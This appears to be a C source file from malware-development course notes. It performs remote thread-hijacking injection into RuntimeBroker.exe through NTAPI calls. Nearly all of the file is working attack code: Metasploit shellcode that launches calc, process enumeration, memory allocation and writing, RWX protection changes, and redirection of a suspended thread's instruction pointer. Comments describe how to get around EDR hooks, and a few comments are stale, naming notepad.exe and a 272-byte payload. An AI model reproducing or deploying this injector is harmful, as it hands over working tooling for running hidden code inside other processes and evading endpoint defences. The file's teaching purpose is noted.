/*
Maldev Academy Notes
Remote Thread Injection via NTAPI
*/

#include <Windows.h>
#include <stdio.h>
#include "Struct.h"

// https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/thread.htm?ts=0,313
#define STATUS_SUCCESS              0x00000000
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

// x64 calc metasploit shellcode 
unsigned char shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// Manual definition of InitializeObjectAttributes needed for NtOpenProcess
VOID InitializeObjectAttributes(POBJECT_ATTRIBUTES p, PUNICODE_STRING n, ULONG a, HANDLE r, PSECURITY_DESCRIPTOR s) {
	if (p) {
		p->Length = sizeof(OBJECT_ATTRIBUTES);
		p->RootDirectory = r;
		p->Attributes = a;
		p->ObjectName = n;
		p->SecurityDescriptor = s;
		p->SecurityQualityOfService = NULL;
	}
}

int wmain() {
	ULONG							uReturnLen1 = NULL,
									uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	NTSTATUS						STATUS = NULL;
	DWORD							dwProcessId = NULL;
	DWORD							dwThreadId = NULL;
	HANDLE							hProcess = NULL;
	HANDLE							hThread = NULL;

	PVOID	pShellcodeAddress = NULL;
	SIZE_T	sSizeOfShellcode = sizeof(shellcode);
	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;
	LPWSTR	szProcessName = L"RuntimeBroker.exe";

	// Get NTDLL.DLL module handle
	HMODULE	hNtdll = GetModuleHandle(L"NTDLL.DLL");

	// Get syscall address
	fnNtQuerySystemInformation	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
	fnNtOpenProcess				pNtOpenProcess = (fnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	fnNtAllocateVirtualMemory	pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	fnNtProtectVirtualMemory	pNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	fnNtWriteVirtualMemory		pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
	fnNtWaitForSingleObject		pNtWaitForSingleObject = (fnNtWaitForSingleObject)GetProcAddress(hNtdll, "NtWaitForSingleObject");

	if (pNtQuerySystemInformation == NULL || pNtOpenProcess == NULL || pNtAllocateVirtualMemory == NULL || pNtProtectVirtualMemory == NULL || pNtWriteVirtualMemory == NULL || pNtWaitForSingleObject == NULL)
		return FALSE;


	//--------------------------------------------------------------------------------
	// Getting Handle to Remote Process & Remote Thread
    //--------------------------------------------------------------------------------

	// First NtQuerySystemInformation call
	// This will fail with STATUS_INFO_LENGTH_MISMATCH
	// But it will provide information about how much memory to allocate (uReturnLen1)	
	pNtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	// Second NtQuerySystemInformation call
	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
	STATUS = pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
		printf("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
		return FALSE;
	}

	// Initialize OBJECT_ATTRIBUTES and CLIENT_ID
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
	CLIENT_ID ClientId;

    // Enumerating SystemProcInfo, looking for process "szProcName"
    while (TRUE) {
        if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcessName) == 0) {
            printf("Found process\n");
			dwProcessId = (DWORD)SystemProcInfo->UniqueProcessId;
			dwThreadId = (DWORD)SystemProcInfo->Threads[0].ClientId.UniqueThread;
			ClientId.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
			ClientId.UniqueThread = dwThreadId;
			STATUS = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
			if (STATUS != 0x0) {
				printf("[!] NtOpenProcess Failed With Error : 0x%0.8X \n", STATUS);
				return FALSE;
			}
			if (hProcess == NULL)
                printf("\n\t[!] OpenProcess Failed With Error : %d \n", GetLastError());
            hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
            if (hThread == NULL)
                printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());
            break;
        }

        // If we reached the end of the SYSTEM_PROCESS_INFORMATION structure
        if (!SystemProcInfo->NextEntryOffset)
            break;

        // Calculate the next SYSTEM_PROCESS_INFORMATION element in the array
        SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
    }
	printf("[+] Target Process \"%ws\" Detected With PID [ %d ] & TID [ %d ] & Handle [ %p ] \n", szProcessName, dwProcessId, dwThreadId, hThread);


    //--------------------------------------------------------------------------------
    // Inject shellcode to remote process
    //--------------------------------------------------------------------------------
	
	// Allocate memory in notepad.exe process using NtAllocateVirtualMemory syscall
	// sPayloadSize is the payload's size (272 bytes)
	pNtAllocateVirtualMemory(hProcess, &pShellcodeAddress, 0, &sSizeOfShellcode, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	printf("\t[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

	// Write payload to the allocated memory space - pShellcodeAddress
	// sPayloadSize's value is now 4096 since NtAllocateVirtualMemory rounds up the value of RegionSize to be a multiple of 4096
	pNtWriteVirtualMemory(hProcess, pShellcodeAddress, &shellcode, sSizeOfShellcode, &sNumberOfBytesWritten);
	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

	// Change memory permission to RWX
	// If NTDLL.DLL is hooked, calling pNtAllocateVirtualMemory will be detected. It's because the syscall is being called by its address (hooked) instead of called via SSN, which avoids hooking.
	pNtProtectVirtualMemory(hProcess, &pShellcodeAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection);


	//--------------------------------------------------------------------------------
	// Hijack remote thread
	//--------------------------------------------------------------------------------

	CONTEXT	ThreadCtx = { .ContextFlags = CONTEXT_ALL };

	// suspend the thread
	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pShellcodeAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[#] Press <Enter> To Run ... ");
	getchar();

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;

}